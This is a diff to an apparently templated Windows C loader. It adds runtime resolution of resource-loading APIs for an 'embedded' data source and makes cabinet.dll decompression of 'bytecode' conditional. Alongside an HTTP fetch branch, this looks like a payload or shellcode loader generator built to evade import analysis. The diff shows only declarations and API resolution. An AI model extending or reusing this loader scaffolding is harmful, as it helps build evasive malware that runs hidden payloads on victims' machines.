@@ -19,6 +19,12 @@ typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTE
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+{% if data_source == 'embedded' %}
+typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
+typedef HGLOBAL (WINAPI* pLoadResource)(HMODULE, HRSRC);
+typedef LPVOID (WINAPI* pLockResource)(HGLOBAL);
+typedef DWORD (WINAPI* pSizeofResource)(HMODULE, HRSRC);
+{% endif %}
 {% if data_source == 'http' %}
 typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
 typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
@@ -52,6 +58,12 @@ pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlZeroMemory pfnRtlZeroMemory;
+{% if data_source == 'embedded' %}
+pFindResourceA pfnFindResourceA;
+pLoadResource pfnLoadResource;
+pLockResource pfnLockResource;
+pSizeofResource pfnSizeofResource;
+{% endif %}
 {% if data_source == 'http' %}
 pWinHttpOpen pfnWinHttpOpen;
 pWinHttpConnect pfnWinHttpConnect;
@@ -86,12 +98,20 @@ void ResolveAPIs() {
     pfnCreateFileA = (pCreateFileA)pfnGetProcAddress(hKernel32, "CreateFileA");
     pfnGetFileSize = (pGetFileSize)pfnGetProcAddress(hKernel32, "GetFileSize");
     pfnReadFile = (pReadFile)pfnGetProcAddress(hKernel32, "ReadFile");
+
+    {% if data_source == 'embedded' %}
+    pfnFindResourceA = (pFindResourceA)pfnGetProcAddress(hKernel32, "FindResourceA");
+    pfnLoadResource = (pLoadResource)pfnGetProcAddress(hKernel32, "LoadResource");
+    pfnLockResource = (pLockResource)pfnGetProcAddress(hKernel32, "LockResource");
+    pfnSizeofResource = (pSizeofResource)pfnGetProcAddress(hKernel32, "SizeofResource");
+    {% endif %}
     
     HMODULE hNtdll = pfnGetModuleHandleA("ntdll.dll");
     if (hNtdll == NULL) { return; }
     pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
     pfnRtlZeroMemory = (pRtlZeroMemory)pfnGetProcAddress(hNtdll, "RtlZeroMemory");
 
+    {% if bytecode_compression == 'mszip_compressor' %}
     HMODULE hCabinet = pfnGetModuleHandleA("cabinet.dll");
     if (hCabinet == NULL && pfnLoadLibraryA != NULL) { 
         hCabinet = pfnLoadLibraryA("cabinet.dll"); 
@@ -101,6 +121,7 @@ void ResolveAPIs() {
         pfnDecompress = (pDecompress)pfnGetProcAddress(hCabinet, "Decompress");
         pfnCloseDecompressor = (pCloseDecompressor)pfnGetProcAddress(hCabinet, "CloseDecompressor");
     }
+    {% endif %}
 
     {% if data_source == 'http' %}
     HMODULE hWinHttp = pfnGetModuleHandleA("winhttp.dll");
